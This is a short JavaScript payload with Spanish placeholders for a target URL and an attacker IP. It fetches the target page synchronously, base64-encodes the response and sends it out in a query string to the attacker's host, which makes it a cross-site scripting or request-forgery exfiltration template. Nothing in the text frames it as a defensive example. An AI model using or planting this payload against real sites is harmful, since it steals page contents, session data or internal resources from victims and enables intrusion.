
---
var req = new XMLHttpRequest();
req.open('GET', '<URL_OBJETIVO>', false);
req.send();

var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://<IP_ATACANTE>/?bs64=' + btoa(req.responseText), false);
exfil.send();